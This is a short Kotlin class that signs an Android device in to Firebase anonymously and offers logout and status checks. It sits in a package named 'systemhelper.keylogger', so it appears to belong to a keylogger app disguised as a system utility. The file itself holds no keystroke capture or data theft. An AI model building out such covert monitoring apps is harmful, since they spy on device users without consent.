package com.systemhelper.keylogger

import android.content.Context
import android.util.Log
import com.google.firebase.FirebaseApp
import com.google.firebase.auth.FirebaseAuth
import com.google.firebase.auth.FirebaseUser
import kotlinx.coroutines.tasks.await

class FirebaseAuthHelper(private val context: Context) {
    companion object {
        private const val TAG = "FirebaseAuthHelper"
    }

    private val auth: FirebaseAuth by lazy {
        // Ensure Firebase is initialized
        FirebaseApp.initializeApp(context)
        FirebaseAuth.getInstance()
    }

    suspend fun authenticateDevice(): FirebaseUser? {
        return try {
            val result = auth.signInAnonymously().await()
            Log.d(TAG, "Device authenticated: ${result.user?.uid}")
            result.user
        } catch (e: Exception) {
            Log.e(TAG, "Authentication failed", e)
            null
        }
    }

    fun getCurrentUser(): FirebaseUser? {
        return auth.currentUser
    }

    fun isAuthenticated(): Boolean {
        return auth.currentUser != null
    }

    fun logout() {
        auth.signOut()
    }
} 